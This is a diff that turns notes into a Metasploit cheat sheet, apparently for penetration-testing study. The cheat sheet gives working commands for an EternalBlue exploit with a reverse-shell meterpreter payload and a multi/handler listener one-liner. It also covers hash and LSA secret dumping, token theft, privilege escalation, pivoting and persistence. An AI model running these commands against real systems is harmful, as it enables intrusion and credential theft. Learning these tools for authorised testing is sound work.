@@ -1,105 +1,200 @@
-#msfconsole #metasploit #MSFVenom #shells #webshells #webenumeration #payloads 
+# Metasploit Framework
 
-Open source framework that is a collection of various scripts, applications, or modules to enumerate or exploit targets
+**Tags:** `#metasploit` `#msfconsole` `#payloads` `#shells` `#postexploit`
 
-Meterpreter 
-- built in persistence
-- can use plugins to expand functionality
+Open-source exploitation framework with modules for exploitation, post-exploitation, pivoting, and payload generation. Uses PostgreSQL to track hosts, services, creds, and loot across an engagement.
 
+**Source:** https://github.com/rapid7/metasploit-framework
+**Install:** Pre-installed on Kali
 
-Payloads
-- Stageless/singles - sends everything at once
-- Staged - broken into parts
-	- exploit - only the code needed to exploit a vuln
-	- stage 0 - starts the initial connection
-	- stage 1 - the larger payload to create the session
-		- meterpreter payload relies on DLL injection and runs in memory
+```bash
+msfconsole -q
+```
 
+> [!note]
+> Staged payloads (`windows/x64/meterpreter/reverse_tcp`) require a running `multi/handler`. Stageless (`_reverse_tcp`) can connect to a plain netcat listener. Meterpreter runs in memory via DLL injection — no disk writes by default.
 
-Location
-- `ls /usr/share/metasploit-framework/`
+---
 
-Commands
-- `msfconsole`  basic start up command
-- `sudo msfdb init` create a metasploit database
-- `sudo msfdb status` check database status
-- `sudo msfdb run` connect to database
-- ``` msfdb reinit
-	cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
-	sudo service postgresql restart
-	msfconsole -q``` recreate the database 
-- `workspace` display what workspace in use
-	- `workspace test1` switch to test1 workspace
-	- `workspace -a test1` add test1 workspace
-	- `workspace -d test1` delete test1 workspace
-- `db_import nmapscan.xml` import nmap scan XML format
-- `db_nmap` run nmap inside msf and store results
-	- `db_nmap -sV -p- -T5 -A 10.10.10.15` example scan, results stored in DB.  Can use `hosts` or `services` to see results
-- `db_export -f xml backup.xml` copy database to xml file
-- `hosts` list of stored hosts
-- `services` list of stored services
-- `creds` list of stored creds
-- `loot` list of collected loot
-- `load {plugin}` load a plugin
-- `sessions` list all the sessions
-	- `sessions -i 1` interact with session 1
-- `jobs -l` list all running jobs
-	- `jobs -k 1` kill job 1
-- `hashdump` or `lsa_dump_samlsa_dump_sam` grap SAM hashes in windows session
-- `lsa_dump_secrets`
+## Database Setup
 
-Searching
-- `search cve:2009 type:exploit
-- `search cve:2009 type:exploit platform:-linux
-- `search cve:2009 -s name
--  `search type:exploit -s type -r
-- `search type:exploit platform:windows cve:2021 rank:excellent microsoft`
-- `grep meterpreter show payloads` list all the payloads and find ones that are meterpreter based
-	- `grep -c meterpreter show payloads` line count of records found
-- `grep meterpreter grep reverse_tcp show payloads` find meterpreter payloads that use reverse TCP connection
-	- `grep -c meterpreter grep reverse_tcp show payloads` line count of records found
-- `search local_exploit_suggester` post exploit, use the local exploit suggester module
+```bash
+sudo msfdb init
+sudo msfdb status
 
--  Modules
-	- `<No.> <type>/<os>/<service>/<name>`
-	- `679  exploit/windows/ftp/scriptftp_list`
-- Module information
-	- `show options` the options to set for the module/payload
-	- `show info` a full description of the module
-	- `show targets` list of different kinds of targets, like different versions
-	- `show payloads` list of payloads a module can use
-	- `show encoder` list the available encoders for the payload
-- Configure modules
-	- `set RHOSTS 10.10.10.40` set the target IP/FQDN
-	- `set LHOSTS 123.456.78.90` set the local IP 
-	- `setg RHOSTS 12.123.123.32` set the target globally
-	- `set target 3` use the 3rd target in the target list
-	- `help` list the commands that can be used
-- Execution
-	- `run -j` run as a job in the background
-	- `exploit` alias for run, single time use without -j
+# Reinit if broken
+msfdb reinit
+cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
+sudo service postgresql restart
+msfconsole -q
+```
 
+---
 
-Post exploit
-- `steal_token 1836` try to steal the user account running for process 1836
-- `search local exploit suggester` have meterpreter session guess what might privesc
-	- `set session 2` some modules require the specification of an open session
-	- configure/run post exploit module just like exploit modules
+## Workspaces
 
+```bash
+workspace               # show current
+workspace -a pentest1   # create + switch
+workspace pentest1      # switch to existing
+workspace -d pentest1   # delete
+```
 
-Custom Modules
-- Copy rb file to the /usr/share/metasploit-framework directory while matching the folder structure of the type of module 
-	- `/usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb` example of a linux webapp exploit
-	- alternatively there may be a ~/.msf4 folder that is symlinked to the actual metasploit module folder.  Same rule applies for folder structure
-	- must be in snake case, `some_module.rb`
-- `msfconsole -m /usr/share/metasploit-framework/modules/` reload the modules 
-	- `reload_all` alternative command inside msfconsole
-- generic rb payloads potentially can be ported as a metasploit module
-	- `cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb` copy ruby script to the appropriate metasploit folder
-	- copy the necessary code from a similar module and paste it into rb file to port
-		- all the necessary includes
-		- customize the info section
-		- customize the options section
+---
 
-- #handlers 
-	- `use multi/handler` sort of a swiss army knife jack of all trades generic handler
+## Database Commands
+
+```bash
+hosts                           # discovered hosts
+services                        # discovered services
+creds                           # stored credentials
+loot                            # collected loot
+
+db_import nmapscan.xml          # import nmap XML
+db_nmap -sV -p- -T4 10.10.10.15  # run nmap + store results
+db_export -f xml backup.xml     # export DB
+```
+
+---
+
+## Searching
+
+```bash
+search cve:2021 type:exploit platform:windows rank:excellent microsoft
+search type:exploit platform:linux
+search eternalblue
+search type:auxiliary name:smb
+
+# Grep payloads
+grep meterpreter show payloads
+grep meterpreter grep reverse_tcp show payloads
+grep -c meterpreter show payloads       # count matches
+```
+
+---
+
+## Module Workflow
+
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+show payloads
+show targets
+show info
+
+set RHOSTS 10.10.10.40
+set LHOST 10.10.14.5
+set LPORT 4444
+setg RHOSTS 10.10.10.40         # set globally across modules
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set target 0
+
+run -j          # background job
+exploit         # foreground (alias for run)
+```
+
+---
+
+## Sessions & Jobs
+
+```bash
+sessions                    # list
+sessions -i 1               # interact
+sessions -u 1               # upgrade shell → meterpreter
+sessions -k 1               # kill
+sessions -K                 # kill all
+
+jobs -l                     # list jobs
+jobs -k 1                   # kill job
+```
+
+---
+
+## Meterpreter
+
+```bash
+# System info
+sysinfo
+getuid
+getpid
+ps
+
+# Filesystem
+pwd; ls; cd C:\\Users
+upload /local/file.exe C:\\Windows\\Temp\\file.exe
+download C:\\path\\file.txt /local/
+
+# Privilege
+getsystem               # auto privesc attempt
+getprivs                # list privileges
+steal_token 1836        # impersonate token from PID
+
+# Credential dumping
+hashdump                # SAM hashes
+load kiwi
+creds_all               # dump everything via kiwi
+lsa_dump_sam
+lsa_dump_secrets
+
+# Pivoting
+portfwd add -l 3389 -p 3389 -r 172.16.5.10
+route add 172.16.5.0/24 1   # route subnet through session 1
+
+# Shell
+shell                   # OS shell
+Ctrl+Z                  # background back to meterpreter
+```
+
+---
+
+## Post-Exploitation Modules
+
+```bash
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+
+use post/windows/gather/hashdump
+set SESSION 1
+run
+
+use post/windows/manage/persistence_exe
+```
+
+---
+
+## Handlers
+
+```bash
+use multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.14.5
+set LPORT 4444
+set ExitOnSession false
+run -j
+```
+
+One-liner:
+```bash
+msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; set ExitOnSession false; run -j"
+```
+
+---
+
+## Custom Module Installation
+
+```bash
+# Drop .rb file matching folder structure
+cp module.rb /usr/share/metasploit-framework/modules/exploits/linux/http/mymodule.rb
+
+# Reload inside msfconsole
+reload_all
+```
+
+Naming: snake_case `.rb`. Match structure: `exploits/`, `auxiliary/`, `post/`, `payloads/`.
+
+---
+
+*Created: 2026-03-13*
+*Updated: 2026-03-13*
+*Model: claude-sonnet-4-6*
